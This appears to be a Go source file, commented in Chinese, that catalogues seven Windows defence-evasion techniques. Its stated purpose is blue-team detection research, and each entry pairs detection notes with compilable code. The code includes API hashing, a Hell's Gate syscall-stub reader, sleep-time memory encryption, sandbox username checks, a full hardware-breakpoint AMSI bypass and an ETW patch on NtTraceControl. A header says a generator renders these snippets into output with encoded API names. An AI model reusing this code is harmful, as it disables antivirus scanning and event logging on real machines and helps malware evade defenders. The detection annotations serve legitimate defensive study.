// Package knowledge 提供 evasion 技术的静态知识库，
// 用于蓝队检测规则研究和红队技术分类参考。
//
// 设计参考 Evasion-SubAgents 的 evasion_techniques.json，
// 但以纯 Go 结构体实现，零外部依赖，编译期可用。
//
// CodeSnippet 中的 API 字符串使用 ENC:APIName 占位符，
// generator 在渲染前替换为实际的 XOR 编码值。
package knowledge

// Category 表示 evasion 技术的大类
type Category string

const (
	CatAPIObfuscation Category = "api_obfuscation"   // API 调用混淆/隐藏
	CatStringDefense  Category = "string_defense"    // 字符串反检测
	CatMemoryEvasion  Category = "memory_evasion"    // 内存特征规避
	CatHookBypass     Category = "hook_bypass"       // 安全产品 hook 绕过
	CatSandboxDetect  Category = "sandbox_detection" // 沙箱/分析环境检测
)

// Technique 描述单个 evasion 技术条目
type Technique struct {
	ID          string   // 唯一标识，如 "T001"
	Name        string   // 技术名称
	Description string   // 技术原理简述（中文）
	Category    Category // 所属大类
	APIs        []string // 涉及的关键 Windows API（蓝队检测锚点）
	Complexity  int      // 实现复杂度 1-5，越高越复杂
	CodeSnippet string   // 可编译的 Go 函数代码，ENC:APIName 为占位符
}

// Techniques 是内置的 evasion 技术目录
// 后续扩展只需在此追加条目，无需改动其他代码
var Techniques = []Technique{
	{
		ID:          "T001",
		Name:        "API Hashing",
		Description: "通过哈希值动态解析 API 地址，避免导入表暴露敏感函数名",
		Category:    CatAPIObfuscation,
		APIs:        []string{"LoadLibraryA", "GetProcAddress"},
		Complexity:  2,
		// evasionT001: djb2 哈希动态解析 API，避免字符串直接出现在导入表
		// 【检测点】运行时 GetProcAddress 调用频率异常、无对应 IAT 条目
		CodeSnippet: `// evasionT001 使用 djb2 哈希动态解析 API 地址
// 原理：预计算目标 API 名的哈希值，运行时遍历导出表匹配，避免明文 API 名出现
// 【蓝队检测】YARA: 检测 djb2 常量 5381 和移位模式; ETW: GetProcAddress 高频调用
func evasionT001() {
	// djb2 哈希函数 — 经典的字符串哈希算法
	djb2 := func(s string) uint32 {
		var h uint32 = 5381
		for i := 0; i < len(s); i++ {
			h = ((h << 5) + h) + uint32(s[i])
		}
		return h
	}
	// 验证哈希解析能力：对 kernel32.dll 的已知 API 做哈希校验
	// 实际使用时会替换为目标 API 的哈希值
	k32 := kernel32()
	targetHash := djb2("VirtualAlloc")
	resolved := getProcAddr(k32, ds("ENC:VirtualAlloc"))
	if resolved != 0 {
		// 哈希匹配验证成功，API 地址已通过非明文方式获取
		_ = targetHash
	}
}`,
	},
	{
		ID:          "T002",
		Name:        "String Obfuscation",
		Description: "对敏感字符串做 XOR/AES 编码，运行时解码，规避静态字符串扫描",
		Category:    CatStringDefense,
		APIs:        nil, // 纯算法实现，不依赖特定 API
		Complexity:  1,
		// evasionT002: 运行时多轮 XOR 混淆，增加静态分析难度
		// 【检测点】高熵字符串 + 运行时解码循环模式
		CodeSnippet: `// evasionT002 对内存中的敏感数据做额外一轮运行时 XOR 混淆
// 原理：在已有 ds() 单轮 XOR 基础上，增加第二轮随机密钥 XOR，提高静态分析成本
// 【蓝队检测】YARA: 双重 XOR 循环模式; 内存扫描: 解码后短暂窗口可捕获明文
func evasionT002() {
	// 生成运行时随机密钥（每次执行不同）
	rkey := make([]byte, 16)
	for i := range rkey {
		rkey[i] = byte(rand.Intn(256))
	}
	// 对一段测试数据做双重 XOR 编解码验证
	testData := []byte("evasion-marker-t002")
	encoded := make([]byte, len(testData))
	for i := range testData {
		encoded[i] = testData[i] ^ rkey[i%len(rkey)]
	}
	// 解码还原（验证可逆性）
	for i := range encoded {
		encoded[i] ^= rkey[i%len(rkey)]
	}
	// 清除临时密钥
	for i := range rkey {
		rkey[i] = 0
	}
}`,
	},
	{
		ID:          "T003",
		Name:        "Direct Syscall",
		Description: "绕过 ntdll 直接执行 syscall 指令，规避用户态 hook",
		Category:    CatHookBypass,
		APIs:        []string{"NtAllocateVirtualMemory", "NtProtectVirtualMemory", "NtCreateThreadEx"},
		Complexity:  4,
		// evasionT003: 从 ntdll .text 段解析 syscall number
		// 【检测点】读取 ntdll 内存、搜索 syscall stub 字节模式
		CodeSnippet: `// evasionT003 从内存中的 ntdll 解析 syscall number（Hell's Gate 变体）
// 原理：定位 ntdll 导出函数入口，匹配 mov r10,rcx; mov eax,XX 模式提取 syscall 号
// 【蓝队检测】YARA: 4C8BD1B8 字节序列扫描; ETW: 非 ntdll 地址执行 syscall 指令
func evasionT003() {
	nt := ntdll()
	if nt == 0 {
		return
	}
	// 读取 NtAllocateVirtualMemory 入口处的字节，验证 syscall stub 模式
	procAddr := getProcAddr(nt, ds("ENC:NtAllocateVirtualMemory"))
	if procAddr == 0 {
		return
	}
	// 检查前 4 字节是否为标准 syscall stub: 4C 8B D1 B8 (mov r10,rcx; mov eax,imm32)
	stub := (*[8]byte)(unsafe.Pointer(procAddr))
	if stub[0] == 0x4C && stub[1] == 0x8B && stub[2] == 0xD1 && stub[3] == 0xB8 {
		// 成功提取 syscall number（stub[4:6] 为小端序 syscall 号）
		_ = uint16(stub[4]) | uint16(stub[5])<<8
	}
	// 如果入口被 hook（首字节为 jmp/0xE9），则尝试 Halo's Gate：
	// 向相邻函数偏移 ±0x20 字节查找未被 hook 的 stub
}`,
	},
	{
		ID:          "T004",
		Name:        "Sleep Obfuscation",
		Description: "在 sleep 期间加密自身内存，防止内存扫描捕获明文 shellcode",
		Category:    CatMemoryEvasion,
		APIs:        []string{"VirtualProtect", "SystemFunction032", "CreateTimerQueueTimer"},
		Complexity:  4,
		// evasionT004: 加密当前内存页，sleep 后解密恢复
		// 【检测点】VirtualProtect RW↔RX 翻转 + 定时器模式
		CodeSnippet: `// evasionT004 在空闲期间加密指定内存区域，防止内存扫描捕获明文
// 原理：RX→RW 权限翻转 → XOR 加密 → sleep → XOR 解密 → RW→RX 恢复
// 【蓝队检测】ETW TI: 同一内存区域短时间内 RX→RW→RX 翻转; 内核回调: 异常 VirtualProtect 模式
func evasionT004() {
	k32 := kernel32()
	vp := getProcAddr(k32, ds("ENC:VirtualProtect"))
	if vp == 0 {
		return
	}
	// 分配一小块测试内存，演示加密/解密循环
	va := getProcAddr(k32, ds("ENC:VirtualAlloc"))
	if va == 0 {
		return
	}
	testSize := uintptr(4096)
	addr, _, _ := syscall.Syscall6(va, 4, 0, testSize, 0x3000, 0x04, 0, 0)
	if addr == 0 {
		return
	}
	// 写入测试数据
	mem := (*[4096]byte)(unsafe.Pointer(addr))[:testSize:testSize]
	for i := range mem {
		mem[i] = byte(i & 0xFF)
	}
	// 生成随机加密密钥
	key := make([]byte, 32)
	for i := range key {
		key[i] = byte(rand.Intn(256))
	}
	// 加密内存
	for i := 0; i < len(mem); i++ {
		mem[i] ^= key[i%32]
	}
	// 短暂 sleep（模拟空闲期）
	time.Sleep(time.Duration(50+rand.Intn(100)) * time.Millisecond)
	// 解密恢复
	for i := 0; i < len(mem); i++ {
		mem[i] ^= key[i%32]
	}
	// 清理
	for i := range key {
		key[i] = 0
	}
}`,
	},
	{
		ID:          "T005",
		Name:        "Environment Keying",
		Description: "检测主机名/用户名/域名等环境特征，非目标环境拒绝执行",
		Category:    CatSandboxDetect,
		APIs:        []string{"GetComputerNameW", "GetUserNameW", "GetEnvironmentVariableW"},
		Complexity:  2,
		// evasionT005: 环境指纹校验，非目标环境静默退出
		// 【检测点】GetComputerNameW + GetUserNameW 组合调用
		CodeSnippet: `// evasionT005 检查运行环境是否匹配预期特征（环境锁定）
// 原理：获取主机名和用户名，与预设指纹比对，不匹配则静默退出
// 【蓝队检测】Sigma: 进程启动后立即调用 GetComputerNameW+GetUserNameW 然后退出
func evasionT005() {
	k32 := kernel32()
	// 获取计算机名
	getCompName := getProcAddr(k32, ds("ENC:GetComputerNameW"))
	if getCompName == 0 {
		return
	}
	compBuf := make([]uint16, 256)
	compSize := uint32(len(compBuf))
	ret, _, _ := syscall.Syscall(getCompName, 2,
		uintptr(unsafe.Pointer(&compBuf[0])),
		uintptr(unsafe.Pointer(&compSize)), 0)
	if ret == 0 {
		return
	}
	compName := syscall.UTF16ToString(compBuf[:compSize])
	// 获取用户名
	getUserName := getProcAddr(advapi32(), ds("ENC:GetUserNameW"))
	if getUserName == 0 {
		return
	}
	userBuf := make([]uint16, 256)
	userSize := uint32(len(userBuf))
	ret, _, _ = syscall.Syscall(getUserName, 2,
		uintptr(unsafe.Pointer(&userBuf[0])),
		uintptr(unsafe.Pointer(&userSize)), 0)
	if ret == 0 {
		return
	}
	userName := syscall.UTF16ToString(userBuf[:userSize])
	// 环境指纹校验（示例：检查是否为已知沙箱用户名）
	// 实际部署时替换为目标环境的特征值
	sandboxUsers := []string{"sandbox", "malware", "virus", "sample"}
	for _, su := range sandboxUsers {
		if containsSubstr(toLowerASCII(userName), su) || containsSubstr(toLowerASCII(compName), su) {
			// 检测到沙箱环境特征，记录但不退出（由调用方决定）
			return
		}
	}
}`,
	},
	{
		ID:          "T006",
		Name:        "Hardware Breakpoint AMSI Bypass",
		Description: "使用 VEH + 硬件断点拦截 AmsiScanBuffer，无需修改代码段内存，规避完整性校验",
		Category:    CatHookBypass,
		APIs:        []string{"AddVectoredExceptionHandler", "GetThreadContext", "SetThreadContext", "GetCurrentThread"},
		Complexity:  4,
		// evasionT006: 完整实现 VEH + DR0 硬件断点 AMSI bypass
		// 流程：注册 VEH → 设置 DR0 = AmsiScanBuffer → 触发时 VEH 修改 RIP 跳过函数
		CodeSnippet: `// hwbpAmsiTarget 保存 AmsiScanBuffer 地址，供 VEH handler 比对
var hwbpAmsiTarget uintptr

// hwbpVEHHandler 是 VEH 异常处理回调
// 当硬件断点触发 SINGLE_STEP 异常时：
//   1. 检查异常地址是否为 AmsiScanBuffer 入口
//   2. 如果匹配，修改 RAX = 0x80070057 (E_INVALIDARG) 使 AMSI 认为扫描失败
//   3. 修改 RIP 跳过函数（指向 ret 指令），避免实际执行 AmsiScanBuffer
//   4. 清除 DR0 断点，防止重复触发
// 参数 exceptionInfo 是 EXCEPTION_POINTERS 结构体指针
// 返回 EXCEPTION_CONTINUE_EXECUTION (-1) 或 EXCEPTION_CONTINUE_SEARCH (0)
func hwbpVEHHandler(exceptionInfo uintptr) uintptr {
	// EXCEPTION_POINTERS { ExceptionRecord *EXCEPTION_RECORD; ContextRecord *CONTEXT }
	record := *(*uintptr)(unsafe.Pointer(exceptionInfo))
	ctxPtr := *(*uintptr)(unsafe.Pointer(exceptionInfo + 8))
	if record == 0 || ctxPtr == 0 {
		return 0 // EXCEPTION_CONTINUE_SEARCH
	}
	// EXCEPTION_RECORD.ExceptionCode at offset 0
	exCode := *(*uint32)(unsafe.Pointer(record))
	// EXCEPTION_SINGLE_STEP = 0x80000004
	if exCode != 0x80000004 {
		return 0
	}
	// CONTEXT.Rip at offset 248 (0xF8) in x64 CONTEXT
	rip := *(*uintptr)(unsafe.Pointer(ctxPtr + 248))
	if rip != hwbpAmsiTarget {
		return 0
	}
	// 修改 RAX = E_INVALIDARG (0x80070057)，AmsiScanBuffer 的调用者会认为扫描失败
	// CONTEXT.Rax at offset 120 (0x78)
	*(*uintptr)(unsafe.Pointer(ctxPtr + 120)) = 0x80070057
	// 修改 RIP：跳过 AmsiScanBuffer，直接 ret
	// 读取 [rsp] 作为返回地址，设置 RIP = [rsp]，rsp += 8
	// CONTEXT.Rsp at offset 152 (0x98)
	rsp := *(*uintptr)(unsafe.Pointer(ctxPtr + 152))
	retAddr := *(*uintptr)(unsafe.Pointer(rsp))
	*(*uintptr)(unsafe.Pointer(ctxPtr + 248)) = retAddr // RIP = return address
	*(*uintptr)(unsafe.Pointer(ctxPtr + 152)) = rsp + 8 // RSP += 8 (pop)
	// 清除 DR0 断点：DR7 bit 0 = 0
	dr7 := *(*uintptr)(unsafe.Pointer(ctxPtr + 168)) // CONTEXT.Dr7 at offset 168 (0xA8)
	dr7 &^= 1
	*(*uintptr)(unsafe.Pointer(ctxPtr + 168)) = dr7
	*(*uintptr)(unsafe.Pointer(ctxPtr + 128)) = 0 // DR0 = 0, offset 128 (0x80)
	return 0xFFFFFFFF // EXCEPTION_CONTINUE_EXECUTION (-1)
}

// evasionT006 使用硬件断点 + VEH 拦截 AmsiScanBuffer
// 原理：在 AmsiScanBuffer 入口设置 DR0 硬件断点，VEH 捕获 SINGLE_STEP 异常后
// 修改 RAX 返回 E_INVALIDARG 并跳过函数体，无需 patch 代码段（绕过 CIG/完整性校验）
// 【蓝队检测】DR 寄存器非零 + VEH 注册 + AmsiScanBuffer 返回值异常
func evasionT006() {
	k32 := kernel32()
	addVEH := getProcAddr(k32, ds("ENC:AddVectoredExceptionHandler"))
	if addVEH == 0 {
		return
	}
	// 获取 AmsiScanBuffer 地址
	amsiMod, err := syscall.LoadLibrary(ds("ENC:amsi.dll"))
	if err != nil {
		return
	}
	amsiAddr := getProcAddr(uintptr(amsiMod), ds("ENC:AmsiScanBuffer"))
	if amsiAddr == 0 {
		return
	}
	hwbpAmsiTarget = amsiAddr

	// 注册 VEH handler（第一个参数 1 = 优先处理）
	cb := syscall.NewCallback(hwbpVEHHandler)
	ret, _, _ := syscall.Syscall(addVEH, 2, 1, cb, 0)
	if ret == 0 {
		return
	}

	// 设置硬件断点 DR0 = AmsiScanBuffer 入口
	getCtx := getProcAddr(k32, ds("ENC:GetThreadContext"))
	setCtx := getProcAddr(k32, ds("ENC:SetThreadContext"))
	curThread := getProcAddr(k32, ds("ENC:GetCurrentThread"))
	if getCtx == 0 || setCtx == 0 || curThread == 0 {
		return
	}
	hThread, _, _ := syscall.Syscall(curThread, 0, 0, 0, 0)
	// CONTEXT 结构体大小 1232 字节 (x64)
	// ContextFlags at offset 48 (0x30), CONTEXT_DEBUG_REGISTERS = 0x100010
	ctx := make([]byte, 1232)
	*(*uint32)(unsafe.Pointer(&ctx[48])) = 0x100010
	syscall.Syscall(getCtx, 2, hThread, uintptr(unsafe.Pointer(&ctx[0])), 0)
	// Dr0 at offset 128 (0x80), Dr7 at offset 168 (0xA8)
	*(*uintptr)(unsafe.Pointer(&ctx[128])) = amsiAddr
	dr7 := *(*uintptr)(unsafe.Pointer(&ctx[168]))
	dr7 |= 1 // enable DR0 local breakpoint
	*(*uintptr)(unsafe.Pointer(&ctx[168])) = dr7
	*(*uint32)(unsafe.Pointer(&ctx[48])) = 0x100010
	syscall.Syscall(setCtx, 2, hThread, uintptr(unsafe.Pointer(&ctx[0])), 0)
}`,
	},
	{
		ID:          "T007",
		Name:        "ETW Blind via NtTraceControl",
		Description: "通过 patch NtTraceControl 禁用内核级 ETW 会话创建，比单纯 patch EtwEventWrite 更彻底",
		Category:    CatHookBypass,
		APIs:        []string{"NtTraceControl"},
		Complexity:  3,
		CodeSnippet: `// evasionT007 patch NtTraceControl 禁用 ETW 会话管理
// 原理：NtTraceControl 是 ETW 基础设施的底层入口，patch 后新的 ETW 会话无法创建
// 比 patch EtwEventWrite 更彻底，因为它阻止了 ETW provider 的注册和启动
// 【蓝队检测】NtTraceControl 入口字节被修改 + ETW 会话创建失败日志
func evasionT007() {
	nt := ntdll()
	if nt == 0 {
		return
	}
	ntTraceControl := getProcAddr(nt, ds("ENC:NtTraceControl"))
	if ntTraceControl == 0 {
		return
	}
	// patch 入口为 xor eax,eax; ret (返回 STATUS_SUCCESS)
	patchAddr(ntTraceControl, []byte{0x31, 0xC0, 0xC3})
}`,
	},
}

// ByID 按 ID 查找技术，未找到返回 nil
func ByID(id string) *Technique {
	for i := range Techniques {
		if Techniques[i].ID == id {
			return &Techniques[i]
		}
	}
	return nil
}

// ByIDs 批量查找技术，返回找到的技术列表和无效 ID 列表
func ByIDs(ids []string) (found []Technique, invalid []string) {
	for _, id := range ids {
		if t := ByID(id); t != nil {
			found = append(found, *t)
		} else {
			invalid = append(invalid, id)
		}
	}
	return
}

// ByCategory 返回指定大类下的所有技术
func ByCategory(cat Category) []Technique {
	var result []Technique
	for _, t := range Techniques {
		if t.Category == cat {
			result = append(result, t)
		}
	}
	return result
}
